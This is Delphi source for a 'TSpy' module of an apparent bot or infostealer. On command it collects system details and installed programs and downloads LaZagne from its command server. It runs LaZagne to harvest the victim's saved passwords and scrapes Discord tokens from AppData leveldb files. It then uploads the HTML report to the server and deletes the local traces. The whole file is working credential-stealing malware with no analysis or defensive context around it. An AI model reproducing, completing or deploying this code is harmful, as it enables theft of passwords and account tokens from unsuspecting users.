unit InfoUnit;

interface

uses
  Windows, System.SysUtils, System.Classes, Registry, IOUtils,
  DProcess,
  Basics, CommandUnit, SystemUnit;

type
  TSpy = class(TWorker)
  public
    procedure Execute; override;
  end;

var
  F: String;

const
  UserHeader = '##################  User: ';
  SectionHeader = '------------------- ';
  PassMatch = 'Password found !!!';
  TableStart = '<table><tr><th>User</th><th>Username</th><th>' +
    'Password</th><th>URL</th></tr>';
  TableEnd = '</table>';

implementation

uses NetUnit;

procedure Rep(S: String; NewLine: Boolean = True);
Begin
  F := F + S;
  if NewLine then
    F := F + #10;
End;

procedure WriteHeader;
Begin
  F := '';
  Rep('<!doctype html><html><head><meta charset="utf-8"><title>Report' +
    '</title> <link rel="stylesheet" type="text/css"' + 'href="' + Options.Gate
    + 'style"></head><body><p>Bot Name: ' + Options.Name + '</p><p>Bot ID: ' +
    Options.GUID + '</p>');
End;

procedure WriteFooter;
Begin
  Rep('</body></html>');
End;

procedure AddPassEntry(U, User, Pass, URL: String);
Begin
  Rep(Format
    ('<tr><td>%s</td><td>%s</td><td>%s</td><td><a href="%s">%s</a></td></tr>',
    [U, User, Pass, URL, URL]));
End;

procedure ParseLazagne;
var
  SR: TSearchRec;
  N, S, User, Header: String;
  T, U, P, URL: String;
  Pass, Started, Pre: Boolean;
  L: TextFile;
Begin
  if FindFirst('credentials_*.txt', faAnyFile, SR) <> 0 then
  Begin
    Rep('<p class="error">Error parsing passwords.</p>');
    FindClose(SR);
    Exit;
  End;
  N := SR.Name;
  FindClose(SR);
  Started := False;
  Pass := False;
  Pre := False;
  AssignFile(L, N);
  Reset(L);
  try
    Repeat
      Readln(L, S);
      if S <> '' then
        if S.Contains(UserHeader) then
        Begin
          Started := True;
          Delete(S, 1, Pos(':', S) + 1);
          User := Copy(S, 1, Pos('#', S) - 2);
        End
        else if S.Contains(SectionHeader) then
        Begin
          Delete(S, 1, Pos(' ', S));
          Header := Copy(S, 1, Pos('-', S) - 2);
          if Pass then
            Rep(TableEnd);
          if Pre then
            Rep('</pre>');
          Pre := False;
          Pass := False;
          Rep('<h3>' + Header + '</h3>');
        End
        else if S.Contains(PassMatch) then
        Begin
          if Not(Pass) then
            Rep(TableStart);
          Pass := True;
          while S <> '' do
          Begin
            Readln(L, S);
            T := Copy(S, 1, Pos(':', S) - 1);
            Delete(S, 1, Pos(':', S) + 1);
            if T = 'URL' then
              URL := S
            else if T = 'Login' then
              U := S
            else if T = 'Password' then
              P := S
            else if T <> '' then
              S := '_';

          End;
          AddPassEntry(User, U, P, URL);
        End
        else if Not(Pass) then
          if Started then
          Begin
            if Not(Pre) then
            Begin
              Pre := True;
              Rep('<pre>');
            End;
            Rep(S + '<br>');
          End;
    Until EOF(L);
  except
  end;
  CloseFile(L);
  DeleteFile(N);
  if Pass then
    Rep(TableEnd);
End;

procedure GetDiscordTokens;
var
  LocalStorage: String;
  Token, Content: String;
  SR: TSearchRec;
  P: LongInt;
Begin
  try
    LocalStorage := IncludeTrailingPathDelimiter
      (GetEnvironmentVariable('AppData'));
    if DirectoryExists(LocalStorage + 'discordcanary') then
      LocalStorage := LocalStorage + 'discordcanary'
    else
      LocalStorage := LocalStorage + 'discord';
    LocalStorage := LocalStorage + '\Local Storage\leveldb';
    Token := '';
    if DirectoryExists(LocalStorage) then
    Begin
      if FindFirst(LocalStorage + '\*.ldb', faAnyFile, SR) = 0 then
      Begin
        Repeat
          Content := TFile.ReadAllText(LocalStorage + '\' + SR.Name);
          P := Pos('"', Content);
          While P > 0 do
          Begin
            Delete(Content, 1, P);
            P := Pos('"', Content);
            if P = 60 then
              Token := Copy(Content, 1, 59);
          end;
          Rep('"' + StringReplace(Token, '<', '&lt;', [rfReplaceAll]) + '"');
        until FindNext(SR) <> 0;
      end;
    end;
  except
  end;
End;

procedure TSpy.Execute;
var
  Mode, S: String;
  All: Boolean;
  A, B: TStringList;
  I: Integer;
  R: TRegistry;
Begin
  Dbg('Information gathering started.');
  Net.SendResponse('Information gathering started.', FID, False);
  WriteHeader;
  try
    Mode := FParams.Values['mode'];
    All := Mode = 'All';
    if All or (Mode = 'System') then
    Begin
      Dbg('Collecting System info.');
      Rep('<h2>System information</h2><pre>');
      A := TStringList.Create;
      SystemUnit.GetSystemInfo(A);
      for I := 0 to A.Count - 1 do
        Rep(A.ValueFromIndex[I]);
      A.Free;
      Rep('</pre>');
    End;
    if All or (Mode = 'Software') then
    Begin
      Dbg('Collecting Software info.');
      Rep('<h2>Installed programs</h2><pre>');
      A := TStringList.Create;
      B := TStringList.Create;
      R := TRegistry.Create(KEY_READ or KEY_WOW64_64KEY);
      With R do
      Begin
        RootKey := HKEY_LOCAL_MACHINE;
        if OpenKey('Software\Microsoft\Windows\CurrentVersion\Uninstall', False)
        then
        Begin
          GetKeyNames(A);
          CloseKey;
        End;
        for I := 0 to A.Count - 1 do
          if OpenKey('Software\Microsoft\Windows\CurrentVersion\Uninstall\' +
            A[I], False) then
          Begin
            S := ReadString('DisplayName');
            if S <> '' then
              B.Add(S);
            CloseKey;
          End;
      End;
      R.Free;
      A.Free;
      B.Sort;
      for I := 0 to B.Count - 1 do
        Rep(B.Strings[I]);
      B.Free;
      Rep('</pre>');
    End;
    if All or (Mode = 'Passwords') then
    Begin
      try
        Dbg('Collecting Passwords info.');
        Rep('<h2>Passwords</h2>');
        if Not(FileExists('lazagne.exe')) then
          Net.DownloadFile(Options.Gate + 'lazagne.exe', 'lazagne.exe');
        Basics.Execute('lazagne.exe', ['all', '-oN'], True, True);
        ParseLazagne;
      except
        on E: Exception do
        begin
          Dbg('Password collection failed.');
          if Not(All) then
            raise;
        end;
      end;
    End;
    if All or (Mode = 'Discord') then
    Begin
      Dbg('Collecting Discord info.');
      Rep('<h2>Discord Tokens</h2><pre>', False);
      GetDiscordTokens;
      Rep('</pre>');
    End;
  except
    on E: Exception do
      Dbg('Info Error ' + E.ClassName + ': ' + E.Message, dError);
  end;
  WriteFooter;
  TFile.WriteAllText('Report.html', F);
  Net.SendFile('Report.html', FID);
  DeleteFile('Report.html');
  Dbg('Information gathering ended.');
End;

end.
